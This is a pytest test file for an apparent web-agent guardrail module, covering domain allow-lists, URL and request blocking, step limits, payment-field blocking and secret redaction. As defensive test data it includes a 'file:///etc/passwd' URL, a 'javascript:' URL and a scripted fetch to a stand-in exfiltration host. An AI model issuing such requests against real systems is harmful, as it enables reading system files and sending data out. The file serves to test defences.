from __future__ import annotations

import pytest

from wta.actions import Fill, Goto
from wta.guardrails import FieldInfo, Guardrails, GuardrailViolation, host_allowed
from wta.redact import Redactor, substitute_secrets

BASE = "http://127.0.0.1:8000"


@pytest.mark.parametrize(
    ("host", "ok"),
    [
        ("localhost", True),
        ("127.0.0.1", True),
        ("sub.localhost", True),
        ("example.com", False),
        ("localhost.evil.com", False),
        ("evil-localhost", False),
    ],
)
def test_host_allowed(host: str, ok: bool) -> None:
    assert host_allowed(host, ("localhost", "127.0.0.1")) is ok


def test_resolve_relative_url_against_base() -> None:
    g = Guardrails()
    assert g.resolve_url("/shop/index.html", BASE) == f"{BASE}/shop/index.html"


@pytest.mark.parametrize(
    ("url", "rule"),
    [
        ("https://example.com/", "domain"),
        ("http://localhost.evil.com/", "domain"),
        ("file:///etc/passwd", "scheme"),
        ("javascript:alert(1)", "scheme"),
    ],
)
def test_blocked_urls(url: str, rule: str) -> None:
    with pytest.raises(GuardrailViolation) as exc:
        Guardrails().resolve_url(url, BASE)
    assert exc.value.rule == rule


def test_request_filter_records_blocked() -> None:
    g = Guardrails()
    assert g.request_allowed(f"{BASE}/shop/shop.js")
    assert g.request_allowed("data:image/png;base64,AAAA")
    assert not g.request_allowed("https://tracker.example.net/pixel.gif")
    assert g.blocked_requests == ["https://tracker.example.net/pixel.gif"]


def test_max_steps() -> None:
    g = Guardrails(max_steps=3)
    for s in (1, 2, 3):
        g.check_step(s)
    with pytest.raises(GuardrailViolation) as exc:
        g.check_step(4)
    assert exc.value.rule == "max_steps"


CARD = FieldInfo(
    tag="input", name="card_number", id="card-number", autocomplete="cc-number", label="Card number"
)
CVC = FieldInfo(tag="input", name="card_cvc", autocomplete="cc-csc", label="CVC")
EMAIL = FieldInfo(tag="input", input_type="email", name="email", label="Email")


def test_payment_field_detection() -> None:
    assert CARD.is_payment() and CARD.is_card_number()
    assert CVC.is_payment() and not CVC.is_card_number()
    assert not EMAIL.is_payment()
    assert FieldInfo(name="iban").is_payment()
    assert FieldInfo(label="Security code").is_payment()


def test_payment_blocked_unless_task_allows() -> None:
    with pytest.raises(GuardrailViolation) as exc:
        Guardrails().check_fill(CARD, "4242 4242 4242 4242")
    assert exc.value.rule == "payment"
    Guardrails().check_fill(EMAIL, "a@b.co")  # non-payment fields are never blocked


def test_only_test_cards_allowed_when_opted_in() -> None:
    g = Guardrails(allow_test_payment_data=True)
    g.check_fill(CARD, "4242 4242 4242 4242")
    g.check_fill(CVC, "123")
    with pytest.raises(GuardrailViolation):
        g.check_fill(CARD, "4111 1111 1111 1112")  # not on the public test list


def test_redactor_masks_secrets_and_cards() -> None:
    r = Redactor({"support_password": "Hunter2-Very-Secret"}, include_env=False)
    out = r.obj({"a": "pw=Hunter2-Very-Secret", "b": ["card 4242 4242 4242 4242 ok"], "n": 3})
    assert out == {
        "a": "pw=[REDACTED:support_password]",
        "b": ["card [CARD ****4242] ok"],
        "n": 3,
    }


def test_redactor_picks_up_api_keys_from_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test-1234567890abcdef")
    r = Redactor()
    assert r.text("auth sk-test-1234567890abcdef") == "auth [REDACTED:OPENAI_API_KEY]"


def test_secret_placeholders() -> None:
    assert substitute_secrets("{{secret:pw}}!", {"pw": "x1"}) == "x1!"
    with pytest.raises(KeyError):
        substitute_secrets("{{ secret:missing }}", {})


@pytest.mark.browser
async def test_goto_blocked_domain_in_browser(make_session) -> None:
    session = await make_session()
    res = await session.execute(Goto(url="https://example.com/"))
    assert not res.ok
    assert res.blocked_by == "domain"


@pytest.mark.browser
async def test_network_requests_to_other_domains_are_aborted(make_session) -> None:
    session = await make_session()
    await session.execute(Goto(url="/dashboard/index.html"))
    outcome = await session.page.evaluate(
        "() => fetch('https://exfil.example.org/collect').then(() => 'sent', () => 'blocked')"
    )
    assert outcome == "blocked"
    assert any("exfil.example.org" in u for u in session.guard.blocked_requests)


@pytest.mark.browser
async def test_payment_fill_blocked_in_browser(make_session) -> None:
    session = await make_session(Guardrails(allow_test_payment_data=False))
    await session.execute(Goto(url="/shop/checkout.html"))
    snap = await session.snapshot()
    card = snap.find("textbox", name="Card number")[0]
    res = await session.execute(Fill(ref=card.ref, text="4242 4242 4242 4242"))
    assert res.blocked_by == "payment"
    assert res.logged_action["text"] == "[REDACTED:payment-field]"
    assert await session.page.locator("#card-number").input_value() == ""
